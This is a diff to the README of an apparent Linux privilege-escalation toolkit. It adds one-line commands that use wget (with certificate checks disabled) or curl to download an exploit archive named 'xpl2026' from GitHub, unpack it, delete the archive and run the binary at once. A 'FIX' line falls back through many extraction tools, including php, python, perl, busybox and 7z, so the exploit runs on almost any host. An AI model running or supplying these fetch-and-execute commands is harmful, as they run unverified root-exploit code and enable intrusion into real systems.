@@ -129,10 +129,17 @@ chmod +x xpl2026
 ```
 
 ## One Liner
+## PART 1 WGET
 ```bash
 wget https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
-
+```
+## PART 2 CURL
+```bash
 curl https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.zip -o xpl2026.zip && unzip xpl2026.zip && rm -rf xpl2026.zip && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
+```
+## FIX
+```bash
+d=$(pwd -P) && f=xpl2026.zip && { command -v unzip >/dev/null && unzip -q "$f"; } || { command -v busybox >/dev/null && busybox unzip -o "$f"; } || { command -v php >/dev/null && php -r '$z=new ZipArchive;if($z->open($argv[1])!==TRUE)exit(1);exit($z->extractTo(".")?0:1);' "$f"; } || { command -v bsdtar >/dev/null && bsdtar -xf "$f"; } || { command -v jar >/dev/null && jar xf "$f"; } || { command -v 7zz >/dev/null && 7zz x -y "$f"; } || { command -v 7z >/dev/null && 7z x -y "$f"; } || { command -v python3 >/dev/null && python3 -m zipfile -e "$f" .; } || { command -v python >/dev/null && python -m zipfile -e "$f" .; } || { command -v perl >/dev/null && perl -MArchive::Zip -e 'Archive::Zip->new($ARGV[0])->extractTree();' "$f"; } && cd xpl2026 && rm -f "$d/$f" && chmod +x xpl2026 && ./xpl2026
 ```
 ---
 
